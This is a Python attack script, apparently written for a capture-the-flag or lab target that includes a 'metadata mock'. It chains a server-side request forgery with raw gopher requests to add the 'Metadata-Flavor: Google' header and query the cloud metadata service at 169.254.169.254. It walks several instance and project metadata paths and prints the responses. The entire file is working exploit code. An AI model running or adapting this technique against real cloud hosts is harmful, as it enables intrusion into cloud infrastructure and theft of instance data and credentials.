#!/usr/bin/env python3
"""Second-order use of the gopher channel: arbitrary headers, then the file read.

Once the request bytes are ours, the metadata mock's gate is gone (add
"Metadata-Flavor: Google"), and the station's POST-only /report is reachable.

Prints the raw response for each probe, and for /report saves the JSON so the base64
PDF in `data` can be decoded separately.
"""
import base64
import html as H
import json
import re
import sys
import time
import urllib.parse

import gopher
import ssrf

FLAVOR = "Metadata-Flavor: Google"


def tape_of(feed):
    st, pg = ssrf.get("/", feed=feed, timeout=45)
    b = (re.search(r"bytes=(\S+?)\s*-->", pg) or [None, "?"])[1]
    t = re.search(r'<pre class="tape">(.*?)</pre>', pg, re.S)
    raw = H.unescape(urllib.parse.unquote(t.group(1))) if t else ""
    return st, b, raw


def w(s):
    sys.stdout.buffer.write((str(s) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def show(label, feed, n=400):
    st, b, raw = tape_of(feed)
    w("--- %s   http=%s bytes=%s len(tape)=%s" % (label, st, b, len(raw)))
    w(raw[:n].replace("\r\n", "\r\n | "))
    time.sleep(0.8)
    return raw


def gpath(path, n=500, label=None):
    return show(label or path,
                gopher.gopher_raw("GET", path, headers=[FLAVOR], host=MH, port=MP), n)


if __name__ == "__main__":
    MH, MP = "169.254.169.254", 80
    gpath("/computeMetadata/v1/", 600, "v1 listing WITH flavor header")
    gpath("/computeMetadata/v1/instance/attributes/", 600)
    gpath("/computeMetadata/v1/instance/", 900)
    gpath("/computeMetadata/v1/project/attributes/", 400)
    gpath("/computeMetadata/v1/instance/name", 300)
    gpath("/computeMetadata/v1/instance/hostname", 300)

